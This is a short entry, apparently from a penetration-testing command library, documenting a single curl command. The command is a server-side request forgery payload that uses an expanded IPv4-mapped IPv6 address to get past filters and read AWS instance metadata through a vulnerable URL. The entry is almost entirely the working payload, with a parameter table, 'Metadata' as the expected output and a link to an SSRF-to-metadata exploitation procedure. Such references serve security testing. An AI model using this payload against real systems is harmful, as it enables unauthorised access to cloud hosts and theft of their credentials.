---
type: command
executor: bash
data: >-
  curl "$_VULN_URL?target=http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/"
  -v
output: null
created_at: '2023-04-06T03:56:38Z'
updated_at: '2023-04-10T20:23:59Z'
platforms:
  - Web
  - AWS
tags:
  - ssrf
  - ipv6
verified: true
validated: true
---

# curl-ipv6-expanded-bypass

## Command

```bash
curl "$_VULN_URL?target=http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/" -v
```

## Description

IPv6 expanded bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_VULN_URL | Vulnerable URL | Yes |

## Examples

### Basic Usage

As shown.

## Expected Output

Metadata.

## Related

- [[procedures/Exploit-SSRF-to-Access-AWS-Instance-Metadata]]
